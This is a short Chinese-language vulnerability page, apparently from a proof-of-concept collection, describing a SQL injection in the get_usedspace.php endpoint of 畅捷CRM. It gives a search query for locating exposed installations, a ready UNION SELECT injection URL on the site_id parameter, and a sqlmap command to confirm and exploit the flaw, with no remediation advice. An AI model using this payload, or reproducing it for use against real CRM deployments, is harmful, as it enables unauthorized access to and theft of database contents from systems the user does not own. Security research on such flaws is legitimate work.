# 畅捷CRM get_usedspace.php SQL注入漏洞

## 漏洞描述

畅捷CRM get_usedspace.php存在SQL漏洞，通过漏洞可获取数据库敏感信息

## 漏洞影响

<a-checkbox checked>畅捷CRM</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="畅捷CRM"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1633506073821-57c99e5c-e655-49d0-a6de-845e13e971f8.png)

验证POC

```php
/webservice/get_usedspace.php?site_id=-1159 UNION ALL SELECT CONCAT(0x76756c6e,0x76756c6e,0x76756c6e)--
```

![img](../../../.vuepress/public/img/1633511742259-b57303f1-0530-477e-a86f-8a403927fe15.png)

使用Sqlmap验证漏洞

```php
sqlmap -u "http://xxx.xxx.xxx.xxx:8000/webservice/get_usedspace.php?site_id=1" -p site_id
```

![img](../../../.vuepress/public/img/1633511844026-09d2cb14-ca2e-4c20-be83-f634144393e2.png)